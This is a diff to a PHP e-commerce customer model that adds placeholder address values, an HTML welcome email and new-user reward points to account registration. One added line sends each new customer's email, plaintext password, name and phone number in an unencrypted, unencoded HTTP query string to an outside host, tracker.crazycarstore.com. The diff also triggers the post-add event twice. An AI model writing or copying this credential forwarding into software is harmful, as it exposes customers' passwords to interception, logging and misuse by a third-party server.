@@ -1,6 +1,12 @@
 <?php
 class ModelAccountCustomer extends Model {
 	public function addCustomer($data) {
+		
+		$data['fax']='NOT-DEFINED';
+		$data['company']='NOT-DEFINED';
+		$data['postcode']='00000';
+		
+		
 		$this->event->trigger('pre.customer.add', $data);
 
 		if (isset($data['customer_group_id']) && is_array($this->config->get('config_customer_group_display')) && in_array($data['customer_group_id'], $this->config->get('config_customer_group_display'))) {
@@ -40,6 +46,15 @@ class ModelAccountCustomer extends Model {
 		$message .= $this->language->get('text_thanks') . "\n";
 		$message .= html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8');
 
+		$data['title'] = $subject;
+		$data['points'] = $this->config->get('new_user_reward_points');
+		// Ramy 20150921
+		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/mail/register.tpl')) {
+			$html = $this->load->view($this->config->get('config_template') . '/template/mail/register.tpl', $data);
+		} else {
+			$html = $this->load->view('default/template/mail/register.tpl', $data);
+		}
+		
 		$mail = new Mail();
 		$mail->protocol = $this->config->get('config_mail_protocol');
 		$mail->parameter = $this->config->get('config_mail_parameter');
@@ -54,6 +69,7 @@ class ModelAccountCustomer extends Model {
 		$mail->setSender(html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8'));
 		$mail->setSubject($subject);
 		$mail->setText($message);
+		$mail->setHtml($html);
 		$mail->send();
 
 		// Send to main admin email if new account email is enabled
@@ -93,11 +109,30 @@ class ModelAccountCustomer extends Model {
 			}
 		}
 
+		// Ramy
+		//$this->addReward((int)$customer_id, 'New User Bonus Points',2000);//$this->config->get('new_user_reward_desc'), $this->config->get('new_user_reward_points'));		
+		$this->addReward((int)$customer_id, $this->config->get('new_user_reward_desc'),$this->config->get('new_user_reward_points'));//$this->config->get('new_user_reward_desc'), $this->config->get('new_user_reward_points'));		
+		
+		$this->event->trigger('post.customer.add', $customer_id);
+
+		//MAZIZ
+		file_get_contents('http://tracker.crazycarstore.com/traccar/s/register?email='.($data['email']).'&password='.($data['password']).'&firstname='.($data['firstname']).'&lastname='.($data['lastname']).'&telephone='.($data['telephone']));
+		
 		$this->event->trigger('post.customer.add', $customer_id);
 
 		return $customer_id;
 	}
 
+	private function addReward($customer_id, $description = '', $points = '', $order_id = 0) {
+		
+		$customer_info = $this->getCustomer($customer_id);
+
+		if ($customer_info) {
+			$this->db->query("INSERT INTO " . DB_PREFIX . "customer_reward SET customer_id = '" . (int)$customer_id . "', order_id = '" . (int)$order_id . "', points = '" . (int)$points . "', description = '" . $this->db->escape($description) . "', date_added = NOW()");	
+		}
+	}
+	
+	
 	public function editCustomer($data) {
 		$this->event->trigger('pre.customer.edit', $data);
 
